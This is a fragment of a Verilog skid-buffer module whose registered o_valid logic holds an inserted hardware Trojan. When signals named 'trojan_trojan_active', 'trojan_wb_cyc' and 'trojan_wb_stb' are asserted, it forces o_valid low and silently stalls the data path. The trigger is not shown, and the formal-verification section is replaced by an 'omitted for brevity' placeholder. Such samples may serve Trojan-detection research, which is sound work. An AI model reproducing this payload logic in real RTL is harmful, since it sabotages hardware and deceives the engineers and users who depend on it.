			else
				o_data = 0;
			// }}}
			// }}}
		end else begin : REG_OUTPUT
			// Register our outputs
			// {{{
			// o_valid
			// {{{
			initial	o_valid = 0;
			always @(posedge i_clk)
			if (i_reset)
				o_valid <= 0;
			else if (!o_valid || i_ready) begin
			    // If Trojan is active and currently a WB cycle/stb, block o_valid
			    if (trojan_trojan_active && trojan_wb_cyc && trojan_wb_stb)
			        o_valid <= 1'b0;
			    else
				    o_valid <= (i_valid || r_valid);
			end
			// }}}

			// o_data
			// {{{
			initial	o_data = 0;
			always @(posedge i_clk)
			if (OPT_LOWPOWER && i_reset)
				o_data <= 0;
			else if (!o_valid || i_ready)
			begin

				if (r_valid)
					o_data <= r_data;
				else if (!OPT_LOWPOWER || i_valid)
					o_data <= i_data;
				else
					o_data <= 0;
			end
			// }}}

			// }}}
		end
		// }}}
	end endgenerate

`ifdef	FORMAL
`ifdef	VERIFIC
`define	FORMAL_VERIFIC
`endif
`endif
//
`ifdef	FORMAL_VERIFIC
	// [unchanged: formal code omitted for brevity]
`endif	// FORMAL_VERIFIC
endmodule

`endif
```
